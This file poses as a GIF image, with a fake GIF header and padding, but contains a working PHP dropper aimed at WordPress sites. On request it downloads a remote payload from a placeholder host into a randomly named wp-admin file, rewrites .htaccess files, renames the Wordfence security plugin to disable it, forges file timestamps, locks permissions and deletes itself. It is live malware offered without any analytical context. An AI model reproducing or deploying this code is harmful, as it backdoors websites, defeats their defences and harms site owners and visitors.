GIF89aÃœ Ãœ Ã·Ã                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                   Ã¿ 
font-face {
    src: url("./fonts/font.woff2");
}
<?php
echo "ansgwxmos3jpamrr9cjsxa31";

$dataHost = "domain_placeholder";
$r=getSiteRoot();
$protocol = ( 
(!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off') 
|| $_SERVER['SERVER_PORT'] == 443 
) ? 'https://' : 'http://';
$domain = $protocol . $_SERVER['HTTP_HOST'];
$u = '/wp-admin/'. random_string() . '.php';
$ht= $r.'/wp-admin/.htaccess'; 
$htIndex= $r.'/.htaccess';
$indexFile= $r.'/index.php'; 
$p = $r . $u;
$plugins = $r.'/wp-content/plugins/';
$wordf = "wordfence";
$waf = $plugins.$wordf;

$doReplacing = False;
$replaceFile = $r."toReplaceFile_fill";
$toReplace = "toReplace_fill";
$replaceWith = "replaceWith_fill";
$dontiffound = "dontiffound_fill";
if (isset($_GET['up'])){
    if (saveContent($p,getContent($dataHost."/raw/default"))){
        chFile($ht,true);
        if (saveContent($ht,getContent($dataHost."/raw/htfolder"))) {
            chFile($ht,false);
        }
        echo ':::'.$domain.$u.':::';
    }else{
        echo 'fail';
    }
}
if (isset($_GET['clear'])){
    if ( is_dir( $waf ) ) {
        chFile($waf,true);
        rename($waf,$plugins.random_string());
    }
    chFile($htIndex,true);
    saveContent($htIndex,getContent($dataHost."/raw/htindex"));
    chFile($htIndex,false);

    chFile($indexFile,true);
    $content = file_get_contents($indexFile);
    $content = preg_replace(
    '/<\?(?:php|=).*?(?=<\?(?:php|=))/s',
        '',
        $content
    );
    chFile($indexFile,true);
    saveContent($indexFile,$content);
    chFile($indexFile,true);
    if ($doReplacing && file_exists($replaceFile)){
        $content = file_get_contents($replaceFile);
        if (strpos($content, $toReplace) !== false 
            && 
            strpos($content, $dontiffound) === false) 
        {

            $content = str_replace(
                $toReplace,
                $replaceWith,
                $content
            );
            chFile($replaceFile,true);
            saveContent($replaceFile,$content);
        }
    }
    unlink(__FILE__);
}

function chFile($file, $open) {
    if (!file_exists($file) and !is_dir( $file ) ) {
        return false;
    }
    $chmodOk = true;
    $chownOk = true;
    if ($open) {
        if (function_exists('posix_getpwuid')) {
            $user = posix_getpwuid(posix_geteuid())['name'];
        } elseif (function_exists('get_current_user')) {
            $user = get_current_user();
        } else {
            $user = 'www-data';
        }
        $chownOk = @chown($file, $user);
        $chmodOk = @chmod($file, 0755);
    } else {
        $user = 'root';
        $chownOk = @chown($file, $user);
        $chmodOk = @chmod($file, 0555);
    }

    return $chownOk && $chmodOk;
}
function getSiteRoot(){
    if (!empty($_SERVER['DOCUMENT_ROOT'])) {
        return realpath($_SERVER['DOCUMENT_ROOT']);
    }
    $uri = parse_url($_SERVER['REQUEST_URI'], PHP_URL_PATH);
    $parts = explode('/', trim($uri, '/'));
    $levelsUp = count($parts);
    $dir = realpath(__DIR__);
    for ($i = 0; $i < $levelsUp; $i++) {
        $dir = dirname($dir);
    }
    return $dir;
}

function getContent($url, $timeout = 40){
    $ua = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.6422.60 Safari/537.36';
    $headers =
        "User-Agent: $ua\r\n" .
        "Accept: */*\r\n" .
        "Accept-Language: en-US,en;q=0.9\r\n" .
        "Accept-Encoding: identity\r\n";
    $ctx = stream_context_create(array(
        'http' => array(
            'timeout' => $timeout,
            'header'  => $headers
        ),
        'ssl'  => array(
            'verify_peer'      => false,
            'verify_peer_name' => false,
        )
    ));
    $data = @file_get_contents($url, false, $ctx);
    if ($data !== false) return $data;

    if (function_exists('curl_init')) {
        $ch = curl_init($url);
        curl_setopt_array($ch, array(
            CURLOPT_RETURNTRANSFER => true,
            CURLOPT_FOLLOWLOCATION => true,
            CURLOPT_CONNECTTIMEOUT => $timeout,
            CURLOPT_TIMEOUT        => $timeout,
            CURLOPT_USERAGENT      => $ua,
            CURLOPT_ENCODING       => '',
            CURLOPT_HTTPHEADER     =>array(
                'Accept: */*',
                'Accept-Language: en-US,en;q=0.9',
                'Accept-Encoding: identity'
            ),
            CURLOPT_SSL_VERIFYPEER => false,
            CURLOPT_SSL_VERIFYHOST => 0
        ));
        $data = curl_exec($ch);
        curl_close($ch);
        if ($data !== false) return $data;
    }
    if (ini_get('allow_url_fopen')) {
        $fp = @fopen($url, 'rb', false, $ctx);
        if ($fp) {
            $data = stream_get_contents($fp);
            fclose($fp);
            if ($data !== false) return $data;
        }
    }
    $p = parse_url($url);
    if (!empty($p['host'])) {
        $scheme = (isset($p['scheme']) ? $p['scheme'] : 'http') === 'https' ? 'ssl' : 'tcp';
        $port = (isset($p['scheme']) && $p['scheme'] === 'https') ? 443 : 80;
        $host = $p['host'];
        $path = (isset($p['path']) ? $p['path'] : '/') . (isset($p['query']) ? '?' . $p['query'] : '');        
        $fp     = @fsockopen("$scheme://$host", $port, $e, $s, $timeout);
        if ($fp) {
            fwrite($fp,
                "GET $path HTTP/1.1\r\n" .
                "Host: $host\r\n" .
                $headers .
                "Connection: close\r\n\r\n"
            );
            $resp = stream_get_contents($fp);
            fclose($fp);
            if ($resp && ($pos = strpos($resp, "\r\n\r\n")) !== false) {
                return substr($resp, $pos + 4);
            }
        }
    }

    return false;
}

function saveContent($path, $source){
    $dir = dirname($path);
    if (!is_dir($dir)) {
        @mkdir($dir, 0755, true);
    }
    $fileExistPath = file_exists($path);
    if ($fileExistPath){
        $stat = stat($path);
        $originalMTime = $stat['mtime'];
        if (!is_writable($path)) {
            @chmod($path, 0644);
            if (!is_writable($path)) return false;
        }
    }
    
    if (@file_put_contents($path, $source) !== false) {
        if ($fileExistPath){
            @touch($path, $originalMTime, $originalMTime);
            @chmod($path, 0555);
        }
        return true;
    }
    $fp = @fopen($path, 'wb');
    if ($fp) {
        $written = @fwrite($fp, $source);
        fclose($fp);
        if ($written !== false) {
            if ($fileExistPath){
                @touch($path, $originalMTime, $originalMTime);
                @chmod($path, 0555);
            }
            return true;
        }
    }
    try {
        $file = new SplFileObject($path, 'wb');
        $bytes = $file->fwrite($source);
        if ($bytes !== false) {
            if ($fileExistPath){
                @touch($path, $originalMTime, $originalMTime);
                @chmod($path, 0555);
            }
            return true;
        }
    } catch (Exception $e) {
        // skip
    }
    $temp = @fopen('php://temp', 'r+');
    if ($temp) {
        fwrite($temp, $source);
        rewind($temp);
        $dest = @fopen($path, 'wb');
        if ($dest) {
            stream_copy_to_stream($temp, $dest);
            fclose($dest);
            fclose($temp);
            if ($fileExistPath){
                @touch($path, $originalMTime, $originalMTime);
                @chmod($path, 0555);
            }
            return true;
        }
        fclose($temp);
    }

    return false;
}
function random_string($length = 6) {
    if (!function_exists('random_int')) {
        function random_int($min, $max) {
            return mt_rand($min, $max);
        }
    }
    $chars = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
    $str = '';
    for ($i = 0; $i < $length; $i++) {
        $str .= $chars[random_int(0, strlen($chars) - 1)];
    }
    return $str;
}

    
?>
